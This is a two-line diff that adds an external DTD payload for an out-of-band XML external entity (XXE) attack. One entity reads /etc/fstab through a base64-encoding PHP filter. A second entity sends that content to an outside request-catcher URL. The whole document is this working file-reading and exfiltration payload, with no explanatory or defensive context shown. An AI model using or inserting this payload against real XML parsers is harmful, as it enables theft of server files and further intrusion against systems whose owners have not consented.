@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/fstab">
+<!ENTITY % param "<!ENTITY exfil SYSTEM 'https://dsfsdf.requestcatcher.com/test/dtd.xml?%data;'>">
